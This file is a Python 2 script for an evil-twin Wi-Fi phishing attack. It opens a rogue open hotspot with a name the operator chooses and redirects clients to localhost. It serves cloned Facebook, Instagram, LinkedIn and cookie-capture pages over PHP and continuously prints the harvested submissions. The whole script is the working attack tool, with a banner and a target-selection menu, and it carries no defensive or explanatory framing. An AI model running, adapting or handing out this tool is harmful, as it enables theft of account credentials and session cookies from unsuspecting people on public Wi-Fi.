import subprocess,time,sys,os,random
################################# BANNER #####################################
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
rr = '\033[39m'
colors=[r,g,y,b,m,c,w,rr]
os.system('clear')
def banner():
	
	pp='''
		           _.-=-._     .-,     '''+random.choice(colors)+'''SOMETHING IS A JOKE!
		         .'       "-.,' /        '''+random.choice(colors)+'''-\_(^_^)_/-
		        (          _.  <          
		         `=.____.="  `._\\  '''
	for i in pp.split('\n'):
		print random.choice(colors)+i
	print rr+'\n'
banner()
################################################################################
################################# ROOT Tester ##################################
if not os.getgid() == 0:
        print "Root PERMISSION Required"
        exit()
################################################################################
################################## Variables ###################################
wifiName=raw_input(r+'['+y+'+'+r+']'+rr+' HostPost Name : ')
data={"1":"base/facebook.com/","2":"base/m.facebook.com/","3":"base/instagram.com/",
	"4":"base/linkedin.com/","5":"base/cookies/"}
print '''
 Select Option
 1) Facebook
 2) Mobile Facebook
 3) Instagram
 4) linkedin
 5) cookies
'''
option=raw_input(r+'['+y+'+'+r+']'+rr+' Option : ')
################################### WI FI ########################################
def interface():
	t=subprocess.check_output('iwconfig').split('\n')
	for i in t:
		if "ESSID" in i:
			face=i.split(' ')[0]
	return face
def hostpot(name):
	fuck='''CHANNEL=default
GATEWAY=10.0.0.1
WPA_VERSION=1+2
ETC_HOSTS=0
DHCP_DNS=gateway
NO_DNS=0
HIDDEN=0
ISOLATE_CLIENTS=0
SHARE_METHOD=none
IEEE80211N=0
IEEE80211AC=0
HT_CAPAB=[HT40+]
VHT_CAPAB=
DRIVER=nl80211
NO_VIRT=0
COUNTRY=
FREQ_BAND=2.4
NEW_MACADDR=
DAEMONIZE=0
NO_HAVEGED=0
WIFI_IFACE='''+interface()+'''
SSID='''+name+'''
PASSPHRASE=
USE_PSK=0'''
	open('creat_ap.conf','wb').write(fuck)
	command="sudo xterm -e create_ap --redirect-to-localhost --config creat_ap.conf".split(' ')
	subprocess.Popen(command)
	time.sleep(12)
################################################################################
############################### PHP ############################################
def site(option):
	command="sudo xterm -e php -S 10.0.0.1:80 -t"+data[option]
	subprocess.Popen(command.split(' '))
################################################################################
################################ Scanner #######################################
def scn(option):
	path=data[option]
	
	while True:
		try:
			f=open(path+"data","rb").read().replace('\n','| |').replace('\r','')

		except:
			f=""
		sys.stderr.write('\r'+random.choice(colors)+f)
		time.sleep(1)
################################################################################
	
hostpot(wifiName)
site(option)	
scn(option)

